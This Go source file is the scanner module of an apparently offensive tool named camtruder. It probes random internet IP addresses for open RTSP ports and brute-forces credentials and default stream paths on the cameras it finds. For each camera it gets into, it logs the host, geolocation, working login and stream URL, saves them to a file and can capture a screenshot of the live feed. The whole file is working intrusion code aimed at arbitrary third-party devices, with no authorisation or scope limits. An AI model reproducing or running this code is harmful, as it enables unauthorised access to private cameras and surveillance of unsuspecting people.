package scanner

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ALW1EZ/camtruder/pkg/config"
	"github.com/ALW1EZ/camtruder/pkg/credentials"
	"github.com/ALW1EZ/camtruder/pkg/rtsp"
	"github.com/ALW1EZ/camtruder/pkg/utils"
	"github.com/ALW1EZ/camtruder/pkg/media"
	"github.com/projectdiscovery/gologger"
)

// Scanner represents the RTSP scanner
type Scanner struct {
	successMap   sync.Map
	found        int32
	warnedIPs    sync.Map
	foundPaths   sync.Map
	targetLimit  int32
	attemptedIPs sync.Map
	verbose      bool
	outFile      *os.File
	timeout      time.Duration
	mediaDir     string // Directory to store screenshots
}

// NewScanner creates a new scanner instance
func NewScanner(verbose bool, outFile *os.File, timeout time.Duration, targetLimit int32, mediaDir string) *Scanner {
	return &Scanner{
		verbose:     verbose,
		outFile:     outFile,
		timeout:     timeout,
		targetLimit: targetLimit,
		mediaDir:    mediaDir,
	}
}

// Worker represents a scanner worker
func (s *Scanner) Worker(work chan struct {
	IP   string
	Cred credentials.Credentials
	Path string
}, wg *sync.WaitGroup) {
	defer wg.Done()

	testedCreds := make(map[string]bool)

	for job := range work {
		// Check if we've reached the target limit
		if s.targetLimit > 0 && atomic.LoadInt32(&s.found) >= s.targetLimit {
			return
		}

		// Skip if IP was already successfully scanned
		if _, found := s.successMap.Load(job.IP); found {
			continue
		}

		// Mark IP as attempted
		s.attemptedIPs.Store(job.IP, true)

		credKey := fmt.Sprintf("%s_%s_%s", job.IP, job.Cred.Username, job.Cred.Password)
		if testedCreds[credKey] {
			continue
		}
		testedCreds[credKey] = true

		if s.verbose {
			gologger.Debug().Label("TEST").Msgf("%s [%s:%s]",
				job.IP, job.Cred.Username, job.Cred.Password)
		}

		// First test credentials with root path
		rootURL := fmt.Sprintf("rtsp://%s:%s@%s/",
			job.Cred.Username,
			job.Cred.Password,
			job.IP)

		rootSuccess, rootResponse := rtsp.TestCredentials(rootURL, s.timeout, s.verbose)
		if rootSuccess {
			if s.targetLimit > 0 && atomic.LoadInt32(&s.found) >= s.targetLimit {
				return
			}
			fingerprint := rtsp.GetFingerprint(rootResponse, rootURL)
			// Only increment and report if this IP hasn't been found before
			if s.incrementFound(job.IP) {
				geoLocation := utils.GetGeoLocation(job.IP)
				gologger.Info().Msgf("╭─ %sFound vulnerable camera%s %s[%s]%s", config.ColorGreen, config.ColorReset, config.ColorYellow, fingerprint, config.ColorReset)
				gologger.Info().Msgf("%s├ Host      :%s %s", config.ColorBold, config.ColorReset, job.IP)
				gologger.Info().Msgf("%s├ Geo       :%s %s", config.ColorBold, config.ColorReset, geoLocation)
				gologger.Info().Msgf("%s├ Auth      :%s %s:%s", config.ColorBold, config.ColorReset, job.Cred.Username, job.Cred.Password)
				gologger.Info().Msgf("%s├ Path      :%s %s", config.ColorBold, config.ColorReset, "Accepts any path")
				gologger.Info().Msgf("%s╰ URL       :%s %s", config.ColorBold, config.ColorReset, rootURL)
				fmt.Println()
				if s.verbose {
					gologger.Info().Label("RESP").Msgf("\n%s", rootResponse)
				}
				utils.WriteResult(rootURL, s.outFile)

				// Take screenshot if media directory is specified
				if s.mediaDir != "" {
					if err := media.TakeScreenshot(rootURL, s.mediaDir, s.timeout); err != nil {
						if s.verbose {
							gologger.Warning().Msgf("Failed to take screenshot: %v", err)
						}
					} else if s.verbose {
						gologger.Info().Msgf("Screenshot saved to %s", s.mediaDir)
					}
				}
			}
			continue
		}

		// If root doesn't work, try dummy path to check credentials
		testURL := fmt.Sprintf("rtsp://%s:%s@%s/DUMMY_TEST_PATH_123456789",
			job.Cred.Username,
			job.Cred.Password,
			job.IP)

		success, response := rtsp.TestCredentials(testURL, s.timeout, s.verbose)
		if success || strings.Contains(response, "404") {
			if s.verbose {
				gologger.Info().Label("VALID").Msgf("Found credentials for %s [%s:%s]",
					job.IP, job.Cred.Username, job.Cred.Password)
			}

			// Try all paths to find working ones
			foundValidPath := false
			for _, path := range config.DefaultPaths {
				if path == "/" {
					continue // Skip root path as we already tested it
				}

				processedPath := credentials.ReplaceCreds(path, job.Cred.Username, job.Cred.Password)
				pathKey := fmt.Sprintf("%s:%s", job.IP, processedPath)

				if _, exists := s.foundPaths.Load(pathKey); exists {
					continue
				}

				pathURL := fmt.Sprintf("rtsp://%s:%s@%s%s",
					job.Cred.Username,
					job.Cred.Password,
					job.IP,
					processedPath)

				if s.verbose {
					gologger.Debug().Label("PATH").Msgf("Trying %s on %s", processedPath, job.IP)
				}

				pathSuccess, pathResponse := rtsp.TestCredentials(pathURL, s.timeout, s.verbose)
				if pathSuccess {
					if s.targetLimit > 0 && atomic.LoadInt32(&s.found) >= s.targetLimit {
						return
					}
					fingerprint := rtsp.GetFingerprint(pathResponse, pathURL)
					s.foundPaths.Store(pathKey, true)
					// Only increment and report if this IP hasn't been found before
					if s.incrementFound(job.IP) {
						result := fmt.Sprintf("rtsp://%s:%s@%s%s",
							job.Cred.Username,
							job.Cred.Password,
							job.IP,
							processedPath)
						geoLocation := utils.GetGeoLocation(job.IP)
						gologger.Info().Msgf("╭─ %sFound vulnerable camera%s %s[%s]%s", config.ColorGreen, config.ColorReset, config.ColorYellow, fingerprint, config.ColorReset)
						gologger.Info().Msgf("%s├ Host      :%s %s", config.ColorBold, config.ColorReset, job.IP)
						gologger.Info().Msgf("%s├ Geo       :%s %s", config.ColorBold, config.ColorReset, geoLocation)
						gologger.Info().Msgf("%s├ Auth      :%s %s:%s", config.ColorBold, config.ColorReset, job.Cred.Username, job.Cred.Password)
						gologger.Info().Msgf("%s├ Path      :%s %s", config.ColorBold, config.ColorReset, processedPath)
						gologger.Info().Msgf("%s╰ URL       :%s %s", config.ColorBold, config.ColorReset, result)
						fmt.Println()
						if s.verbose {
							gologger.Info().Label("RESP").Msgf("\n%s", pathResponse)
						}
						utils.WriteResult(result, s.outFile)

						// Take screenshot if media directory is specified
						if s.mediaDir != "" {
							if err := media.TakeScreenshot(result, s.mediaDir, s.timeout); err != nil {
								if s.verbose {
									gologger.Warning().Msgf("Failed to take screenshot: %v", err)
								}
							} else if s.verbose {
								gologger.Info().Msgf("Screenshot saved to %s", s.mediaDir)
							}
						}
					}
					foundValidPath = true
				} else if s.verbose && strings.Contains(pathResponse, "404") {
					gologger.Debug().Label("PATH").Msgf("Valid path format but no stream: %s", processedPath)
				}
			}

			if !foundValidPath && s.verbose {
				if _, warned := s.warnedIPs.LoadOrStore(job.IP, true); !warned {
					gologger.Warning().Msgf("%sValid credentials for %s but no working stream path%s", config.ColorYellow, job.IP, config.ColorReset)
				}
			}
		} else if s.verbose {
			gologger.Debug().Label("FAIL").Msgf("%s: %s", job.IP, response)
		}
	}
}

// incrementFound atomically increments the found counter
func (s *Scanner) incrementFound(ip string) bool {
	if _, exists := s.successMap.LoadOrStore(ip, true); !exists {
		atomic.AddInt32(&s.found, 1)
		return true
	}
	return false
}

// GetFoundCount returns the number of found cameras
func (s *Scanner) GetFoundCount() int32 {
	return atomic.LoadInt32(&s.found)
}

// FindOpenPorts finds IPs with RTSP port open
func (s *Scanner) FindOpenPorts(limit int32) []string {
	var openPorts []string
	var mutex sync.Mutex
	var wg sync.WaitGroup
	portChan := make(chan string, 1000)

	// Start port scanning workers
	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range portChan {
				if utils.ScanPort(ip, s.timeout) {
					mutex.Lock()
					openPorts = append(openPorts, ip)
					mutex.Unlock()
					if s.verbose {
						gologger.Info().Msgf("Found open port: %s", ip)
					}
				}
			}
		}()
	}

	// Generate and send IPs until we find enough open ports
	go func() {
		attempts := 0
		maxAttempts := 1000000 // Prevent infinite loop

		for int32(len(openPorts)) < limit && attempts < maxAttempts {
			ip := utils.GenerateRandomIP()

			// Skip if IP was already attempted
			if _, exists := s.attemptedIPs.LoadOrStore(ip, true); !exists {
				portChan <- ip
				attempts++

				// Periodically report progress if verbose
				if s.verbose && attempts%1000 == 0 {
					gologger.Debug().Msgf("Attempted %d IPs, found %d open ports",
						attempts, len(openPorts))
				}
			}
		}

		if attempts >= maxAttempts {
			gologger.Warning().Msgf("Reached maximum attempts (%d) while searching for open ports",
				maxAttempts)
		}
		close(portChan)
	}()

	wg.Wait()
	return openPorts
}
